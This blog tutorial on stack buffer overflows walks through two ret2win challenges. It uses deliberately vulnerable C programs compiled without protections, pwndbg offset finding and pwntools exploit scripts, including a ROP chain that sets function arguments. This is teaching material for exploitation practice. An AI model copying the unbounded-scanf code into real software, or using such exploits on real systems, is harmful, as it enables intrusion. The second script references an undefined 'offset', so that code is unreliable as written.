<!-- ---
author: pl4int3xt
layout: post
title: Buffer overfl0w 02 - ret2win & ret2win with params
date: '2024-01-11'
description: "Learn how to inject shellcodes and return to libc using buffer overflow"
categories: [Binary Exploitation 101]
tags: [Buffer overflow, binary exploitation]
---

## ret2win

In the following code the watchdogs function cannot be executed by the program since there is no place in the code where it is called. Our objective is to return to that function which is a win function and so it's a `ret2win` challenge
```c
#include <stdio.h>

void watchdogs(){
    printf("Let's play W4tchd0g5");
}

void register_favourite_game(){
    char buffer[16];

    printf("Enter your favourite video game :\n");
    scanf("%s", buffer);
    printf("Your favourite video games is , %s\n", buffer);    
}

int main(){
    register_favourite_game();

    return 0;
}
```

Again Let's compile the code to an executable binary and remove the protections which might prevent us from exploiting the code. The code is dynamically linked and its not stripped.

```shell
gcc watchdogs.c -o watchdogs -fno-stack-protector -z execstack -no-pie
```

Let's run the program and input our favourite game

```shell
~/Documents/coding/c$ ./watchdogs
Enter your favourite video game :
Fortnite
Your favourite video games is , Fortnite
```

Let's run the program and input a long character greater than 16 characters

```shell
~/Documents/coding/c$ ./watchdogs
Enter your favourite video game :
dafgshkjdljkewucywklbecrtktwveuityikwrntuicw
Your favourite video games is , dafgshkjdljkewucywklbecrtktwveuityikwrntuicw
Segmentation fault (core dumped)
```

we get a segmentation fault meaning maybe we have overwritten some important variables of the code or the return address. Let's get the (offset) number of characters we need to write before overwritting the return address using pwndbg. We first use cyclic to generate 50 random characters

```shell
~/Documents/coding/c$ pwndbg watchdogs
Reading symbols from watchdogs...
(No debugging symbols found in watchdogs)
Cannot convert between character sets `UTF-32' and `UTF-8'
pwndbg: loaded 147 pwndbg commands and 46 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $ida GDB functions (can be used with print/break)
------- tip of the day (disable with set show-tips off) -------
break-if-taken and break-if-not-taken commands sets breakpoints after a given jump instruction was taken or not
pwndbg> cyclic 50
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga
```

We then run the program and enter the values we got from cyclic

```shell
pwndbg> run
Starting program: /home/pl4int3xt/Documents/coding/c/watchdogs 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter your favourite video game :
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga
```

The executable with crash and we will be able to see this as part of the REGISTERS output

```shell
*R13  0x7fffffffdf58 —▸ 0x7fffffffe2d1 ◂— 'SHELL=/bin/bash'
*R14  0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401110 (__do_global_dtors_aux) ◂— endbr64 
*R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2d0 ◂— 0x0
*RBP  0x6161616161616163 ('caaaaaaa')
*RSP  0x7fffffffde28 ◂— 'daaaaaaaeaaaaaaafaaaaaaaga'
*RIP  0x4011b3 (register_favourite_game+83) ◂— ret 
```
since this is a 64bit binary we need to get the first 8 values of RSP `daaaaaaa` since they are the characters which would have made it to the RIP. We use cyclic to lookup the characters
```shell
pwndbg> cyclic -l daaaaaaa
Finding cyclic pattern of 8 bytes: b'daaaaaaa' (hex: 0x6461616161616161)
Found at offset 24
```

We will put 24 random characters before overwriting the return address. Let's create a python script to automate this

```python
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Set up pwntools for the correct architecture
exe = './watchdogs'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# Start the executable
io = start()

# How many bytes to the instruction pointer (RIP)?
padding = 24

payload = flat(
    b'A' * 24,
    elf.functions.watchdogs  # 0x00401146
)

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter(b':', payload)

# Receive the flag
io.interactive()
```

Let's run the code and see the output

```shell
~/Documents/coding/c$ python3 watchdogs.py
[+] Starting local process './watchdogs': pid 48776
[DEBUG] Received 0x22 bytes:
    b'Enter your favourite video game :\n'
[DEBUG] Sent 0x21 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  46 11 40 00  00 00 00 00  │AAAA│AAAA│F·@·│····│
    00000020  0a                                                  │·│
    00000021
[*] Switching to interactive mode

[DEBUG] Received 0x53 bytes:
    00000000  59 6f 75 72  20 66 61 76  6f 75 72 69  74 65 20 76  │Your│ fav│ouri│te v│
    00000010  69 64 65 6f  20 67 61 6d  65 73 20 69  73 20 2c 20  │ideo│ gam│es i│s , │
    00000020  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000030  41 41 41 41  41 41 41 41  46 11 40 0a  4c 65 74 27  │AAAA│AAAA│F·@·│Let'│
    00000040  73 20 70 6c  61 79 20 57  34 74 63 68  64 30 67 35  │s pl│ay W│4tch│d0g5│
    00000050  3a 4f 0a                                            │:O·│
    00000053
Your favourite video games is , AAAAAAAAAAAAAAAAAAAAAAAAF\x11@
Let's play W4tchd0g5
[*] Got EOF while reading in interactive
$ 
[*] Process './watchdogs' stopped with exit code -11 (SIGSEGV) (pid 48776)
```

We were able to execute our unreachable function W4TCHD0G5

## ret2win with params

Our hacked function now has two parameters which must match some specific values for us to get the top secret output.

```c
#include <stdio.h>

void hacked(long first, long second){
    if (first == 0xdeadbeefdeadbeef && second == 0xc0debabec0debabe){
        printf("This function is TOP SECRET! How did you get in here?! :O\n");
    }else{
        printf("Unauthorised access to secret function detected, authorities have been alerted!!\n");
    }
}

void register_name(){
    char buffer[16];

    printf("Name:\n");
    scanf("%s", buffer);
    printf("Hi there, %s\n", buffer);    
}

int main(){
    register_name();

    return 0;
}
```

Let's compile the binary and exploit it

```shell
gcc ret2win_params.c -o ret2win_params -fno-stack-protector -no-pie
```

Let's open the binary win pwndbg

```shell
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
pwndbg> run
Starting program: /home/pl4int3xt/Documents/pwn/shellcode/ret2win_params 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
Name:
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
Hi there, aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

Program received signal SIGSEGV, Segmentation fault.
0x00000000004011e9 in register_name ()
```

Let's get the offset 

```shell
pwndbg> cyclic -l daaaaaaa
Finding cyclic pattern of 8 bytes: b'daaaaaaa' (hex: 0x6461616161616161)
Found at offset 24
```


```python
from pwn import *

# Allows easy swapping betwen local/remote/debug modes
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Set up pwntools for the correct architecture
exe = './ret2win_params'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# Start program
io = start()

# POP RDI gadget found with ropper
pop_rdi = 0x40124b
# POP RSI; POP R15 gadget found with ropper
pop_rsi_r15 = 0x401249

# Build the payload
payload = flat({
    offset: [
        pop_rdi,  # Pop the next value to RDI
        0xdeadbeefdeadbeef,
        pop_rsi_r15,  # Pop the next value to RSI (and junk into R15)
        0xc0debabec0debabe,
        0x0,
        # With params in correct registers, call hacked function
        elf.functions.hacked
    ]
})

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter(b':', payload)

# Get flag
io.interactive()
``` -->
